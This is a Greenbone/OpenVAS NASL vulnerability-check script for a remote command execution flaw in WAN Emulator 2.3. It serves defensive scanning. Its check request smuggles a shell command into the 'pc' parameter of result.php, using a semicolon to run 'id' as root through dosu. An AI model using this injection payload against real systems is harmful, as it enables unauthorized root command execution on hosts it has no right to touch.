# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103561");
  script_version("2025-08-14T05:40:53+0000");
  script_tag(name:"last_modification", value:"2025-08-14 05:40:53 +0000 (Thu, 14 Aug 2025)");
  script_tag(name:"creation_date", value:"2012-09-10 09:49:21 +0200 (Mon, 10 Sep 2012)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2012-10041");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("WAN Emulator RCE Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"WAN Emulator is prone to a remote command execution (RCE)
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to execute arbitrary commands
  within the context of the affected application.");

  script_tag(name:"affected", value:"WAN Emulator 2.3 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/linux/http/wanem_exec.rb");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/21190");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/wan-emulator-command-execution");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/WANem", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/title.html";
  buf = http_get_cache( item:url, port:port );

  if( "<TITLE>Welcome to WANem" >< buf || "Wide Area Network Emulator" >< buf ) {

    url = dir + '/result.php?pc=127.0.0.1;/UNIONFS/home/perc/dosu%20id%26';

    if( http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+" ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
